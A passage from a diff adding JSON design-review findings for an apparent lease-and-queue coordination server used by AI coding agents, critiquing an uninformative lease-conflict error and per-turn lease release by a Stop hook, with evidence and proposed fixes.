+  "evidence": "server lib.rs:511-519: '{reason_code: lease_conflict, message: \"Requested lease conflicts with an active lease or reserved request.\"}' — no mention of state.intent.request, queueing, notifications, or resume; contrast the authorize path which auto-enqueues (policy_service.rs:262-297).",
+  "description": "An agent that follows ceremony (declare, then lease) on a contested file hits the lease 409 BEFORE ever reaching the authorize path that would have enqueued it. The error names no next step, so the natural LLM behaviors are retrying the same call or abandoning — both wrong; the correct move (state_intent_request with a request_id to join the FIFO) is documented only in the README.",
+  "solution": "Extend the lease_conflict response with the blocking session id and explicit guidance: 'To wait for this path, call state.intent.request {action, path, purpose, request_id}; poll state_notifications_poll and claim with state.intent.claim when reserved.'",
+  "sources": [
+   "ergonomics"
+  ]
+ },
+ {
+  "title": "Stop-hook finalize releases leases per turn, silently reopening contention windows mid-task",
+  "severity": "minor",
+  "area": "concept",
+  "evidence": "Stop hook -> /v1/activity/finalize (hook.rs:349-361; install.rs:816-821); finalize releases all session leases and completes intents (server lib.rs:670-678). Stop-hook errors are only eprintln warnings with no outbox (hook.rs:120-126).",
+  "description": "Because Stop fires at every assistant-turn end, a session 'holding' a file across a multi-turn task actually relinquishes it between turns: another session can lease the file while the human is typing the next prompt, after which the original session queues behind work it believed it owned. This may be intended turn-scoping, but no doc states leases are turn-scoped, and the ceremony cost of re-establishing scope every turn is the direct consequence. Conversely, if the Stop hook fails (server hiccup), leases linger up to 300s past the last heartbeat with no cleanup signal.",
+  "solution": "Document turn-scoped lease lifetime explicitly, or make Stop downgrade leases to a short grace TTL instead of releasing immediately, letting a continuing session resume without re-ceremony while still freeing abandoned work quickly.",
+  "sources": [
+   "ergonomics"
+  ]
+ }
+]
